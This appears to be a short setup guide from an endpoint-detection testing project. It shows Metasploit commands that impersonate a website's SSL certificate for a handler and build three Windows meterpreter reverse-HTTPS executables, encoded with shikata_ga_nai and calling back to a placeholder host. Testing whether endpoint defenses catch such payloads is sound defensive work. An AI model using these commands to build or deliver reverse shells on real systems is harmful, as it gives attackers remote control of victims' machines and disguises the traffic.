# Inital Setup for MSF Testing

Change the default metasploit SSL cert:

```
sudo msfconsole

use auxiliary/gather/impersonate_ssl 
set RHOST example.com

run
```

Example output:
![output](https://github.com/blumirabrian/endpoint-detection-methology/blob/main/msf/edr1.png "Command Output")

Take the .pem file and use for setting the SSL cert in the msf.rc file.

Change:
```
set HANDLERSSLCERT /root/attack.crt
```

To your new cert you collected:
```
set HANDLERSSLCERT /root/.msf4/loot/20210526091350_default_93.184.216.34_93.184.216.34_pe_809138.pem
```

## Payload Generation

Create 3 msfvenom payloads (**make sure to change the lhost IP to your Kali system IP address**)

Payload 1
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test.exe
```

Payload 2
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 20 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test2.exe
```

Payload 3
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 30 lport=8443 lhost=1.2.3.4 -b "\x00\xff" -f exe -o test3.exe
```

The command should complete and output 3 testing executables. For the high interation payloads you may recieve an error as the paylod errors during the interation process, just rerun the command until you get a successful run.

![output payload 1](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr2.png "Payload 1")

Example of failed run for payload 3:

![output payload 3 error](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr3.png "Payload 3 Error")

Example of successful run for payload 3:

![output payload 3 success](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr4.png "Payload 3 Success")
